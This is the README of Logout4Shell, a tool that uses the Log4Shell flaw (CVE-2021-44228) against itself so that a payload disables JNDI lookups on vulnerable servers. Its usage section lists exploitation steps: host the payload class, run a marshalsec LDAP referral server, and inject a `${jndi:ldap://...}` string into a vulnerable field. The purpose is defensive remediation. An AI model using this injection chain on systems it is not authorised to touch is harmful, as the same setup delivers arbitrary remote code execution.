# Logout4Shell
![logo](https://github.com/Cybereason/Logout4Shell/raw/main/assets/CR_logo.png)

## Description 

A vulnerability impacting Apache Log4j versions 2.0 through 2.14.1 was disclosed on the project’s Github on December 9, 2021. 
The flaw has been dubbed “Log4Shell,”, and has the highest possible severity rating of 10. Software made or
managed by the Apache Software Foundation (From here on just "Apache") is pervasive and comprises nearly a third of all
web servers in the world—making this a potentially catastrophic flaw.
The Log4Shell vulnerability CVE-2021-44228 was published on 12/9/2021 and allows remote code execution on vulnerabe servers.


While the best mitigation against these vulnerabilities is to patch log4j to
~~2.15.0~~2.16.0 and above, in Log4j version (>=2.10) this behavior can be partially mitigated (see below) by
setting system property `log4j2.formatMsgNoLookups` to `true` or by removing
the JndiLookup class from the classpath. 

On 12/14/2001 the Apache software foundation disclosed CVE-2021-45046 which was patched in log4j version 2.16.0. This
vulnerability showed that in certain scenarios, for example, where attackers can control a thread-context variable that
gets logged, even the flag `log4j2.formatMsgNoLookups` is insufficient to mitigate log4shell.

However, enabling these system property requires access to the vulnerable servers as well as a restart. 
The [Cybereason](https://www.cybereason.com) research team has developed the
following code that _exploits_ the same vulnerability and the payload therein
sets the vulnerable setting as disabled. The payload then searches
for all `LoggerContext` and removes the JNDI `Interpolator` preventing even recursive abuses. 
this effectively blocks any further attempt to exploit Log4Shell on this server. 

This Proof of Concept is based on [@tangxiaofeng7](https://github.com/tangxiaofeng7)'s [tangxiaofeng7/apache-log4j-poc](https://github.com/tangxiaofeng7/apache-log4j-poc)

However, this project attempts to fix the vulnerability by using the bug against itself.
You can learn more about Cybereason's "vaccine" approach to the Apache Log4Shell vulnerability (CVE-2021-44228) on our website.

Learn more: [Cybereason Releases Vaccine to Prevent Exploitation of Apache Log4Shell Vulnerability (CVE-2021-44228)](https://www.cybereason.com/blog/cybereason-releases-vaccine-to-prevent-exploitation-of-apache-log4shell-vulnerability-cve-2021-44228)

## Supported versions
Logout4Shell supports log4j version 2.0 - 2.14.1

## How it works
On versions (>= 2.10.0) of log4j that support the configuration `FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS`, this value is
set to `True` disabling the lookup mechanism entirely. As disclosed in CVE-2021-45046, setting this flag is insufficient,
therefore the payload searches all existing `LoggerContexts` and removes the JNDI key from the `Interpolator` used to
process `${}` fields. This means that even other recursive uses of the JNDI mechanisms will fail.

These changes are local to the running java process and will revert when the JVM restarts. 

We're considering a more permanent fix - for example, edit the jar on disk of the vulnerable server so that the class
JndiLookup will not be instantiated. We'd love community feedback on such an idea and it's associated risks.

## How to use

1. Download this repository and build it 

   1.1 `git clone https://github.com/cybereason/Logout4Shell.git`

   1.2 build it - `mvn package`

   1.3 `cd target/classes`

   1.4 run the webserver - `python3 -m http.server 8888`

2. Download, build and run Marshalsec's ldap server

   2.1 `git clone https://github.com/mbechler/marshalsec.git`

   2.2 `mvn package -DskipTests`

   2.3 `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<IP_OF_PYTHON_SERVER_FROM_STEP_1>:8888/#Log4jRCE"`

3. To immunize a server

   3.1 enter `${jndi:ldap://<IP_OF_LDAP_SERVER_FROM_STEP_2>:1389/a}` into a vulnerable field (such as user name)


## DISCLAIMER: 
The code described in this advisory (the “Code”) is provided on an “as is” and
“as available” basis may contain bugs, errors and other defects. You are
advised to safeguard important data and to use caution. By using this Code, you
agree that Cybereason shall have no liability to you for any claims in
connection with the Code. Cybereason disclaims any liability for any direct,
indirect, incidental, punitive, exemplary, special or consequential damages,
even if Cybereason or its related parties are advised of the possibility of
such damages. Cybereason undertakes no duty to update the Code or this
advisory.

## License
The source code for the site is licensed under the MIT license, which you can find in the LICENSE file.
